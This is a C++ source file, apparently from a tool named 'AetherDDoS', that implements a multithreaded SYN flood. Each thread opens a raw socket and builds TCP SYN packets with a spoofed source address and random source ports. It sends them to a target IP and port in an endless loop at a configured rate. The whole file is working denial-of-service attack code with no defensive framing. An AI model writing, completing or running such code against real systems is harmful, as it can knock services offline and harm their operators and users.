#include "aether_ddos.h"
#include <sys/socket.h>
#include <netinet/tcp.h>
#include <random>

void AetherDDoS::syn_flood(int thread_id) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) { log("[-] SYN Socket failed: Thread " + std::to_string(thread_id)); return; }

    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip.c_str(), &target_addr.sin_addr);

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dist(1024, 65535);

    while (true) {
        char packet[4096] = {0};
        struct iphdr* iph = (struct iphdr*)packet;
        struct tcphdr* tcph = (struct tcphdr*)(packet + sizeof(struct iphdr));
        iph->version = 4; iph->ihl = 5; iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
        iph->protocol = IPPROTO_TCP; iph->saddr = inet_addr("192.168.0.1");
        iph->daddr = inet_addr(target_ip.c_str());
        tcph->source = htons(dist(gen)); tcph->dest = htons(target_port); tcph->syn = 1;
        tcph->window = htons(5840);
        sendto(sock, packet, iph->tot_len, 0, (sockaddr*)&target_addr, sizeof(target_addr));
        log("[*] SYN Thread " + std::to_string(thread_id) + ": Packet sent!");
        std::this_thread::sleep_for(std::chrono::microseconds(1000000 / rate_per_thread));
    }
    close(sock);
}
